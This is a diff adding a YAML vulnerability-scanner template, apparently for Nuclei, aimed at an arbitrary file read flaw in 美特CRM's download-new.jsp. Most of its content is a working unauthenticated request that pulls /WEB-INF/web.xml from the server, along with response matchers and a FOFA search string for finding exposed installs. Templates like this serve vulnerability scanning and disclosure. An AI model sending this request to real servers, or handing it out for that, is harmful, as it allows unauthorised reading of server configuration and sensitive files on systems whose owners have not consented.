@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - <?xml version=
+            - <web-app
+            - </web-app>
+            - <servlet>
+            - </servlet>
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml HTTP/1.1
+          Host: {{Hostname}}
+id: meiteCRM-download-new_jsp-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/common/scripts/basic.js"
+        美特CRM download-new.jsp 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。
+    name: 美特CRM download-new.jsp 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/8PI8pLis8MnD0rMBLQ9nxQ
+    severity: high
+    tags:
+        - File reading
+        - 美特CRM
+        - Servlet
